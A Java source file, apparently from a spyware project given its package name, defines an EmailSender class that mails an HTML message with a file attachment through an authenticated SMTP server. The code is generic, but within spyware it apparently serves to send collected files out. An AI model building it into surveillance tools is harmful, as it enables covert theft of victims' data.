package spyware;

import java.util.Properties;

import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;

public class EmailSender {

	public static void sendEmail(String host, String port, final String userName, final String password,
			String toAddress, String subject, String message, String attachFiles) throws MessagingException {
		// Set SMTP server properties
		Properties properties = new Properties();
		properties.put("mail.smtp.host", host);
		properties.put("mail.smtp.port", port);
		properties.put("mail.smtp.auth", "true");
		properties.put("mail.smtp.starttls.enable", "true");
		properties.put("mail.smtp.ssl.protocols", "TLSv1.2");
		// Create a new session with an authenticator
		Authenticator auth = new Authenticator() {
			public PasswordAuthentication getPasswordAuthentication() {
				return new PasswordAuthentication(userName, password);
			}
		};
		Session session = Session.getInstance(properties, auth);

		// Create a new e-mail message
		Message msg = new MimeMessage(session);

		msg.setFrom(new InternetAddress(userName));
		InternetAddress[] toAddresses = { new InternetAddress(toAddress) };	
		msg.setRecipients(Message.RecipientType.TO, toAddresses);
		msg.setSubject(subject);
		msg.setSentDate(new java.util.Date());

		// Create message part
		MimeBodyPart messageBodyPart = new MimeBodyPart();
		messageBodyPart.setContent(message, "text/html");

		// Create a multipart/mixed part
		Multipart multipart = new MimeMultipart();
		multipart.addBodyPart(messageBodyPart);

		// Attach the file
		MimeBodyPart attachPart = new MimeBodyPart();

		try {
			attachPart.attachFile(attachFiles);
		} catch (Exception ex) {
			ex.printStackTrace();
		}

		multipart.addBodyPart(attachPart);

		// Set the multipart message to the email message
		msg.setContent(multipart);

		// Send email
		Transport.send(msg);
	}
}
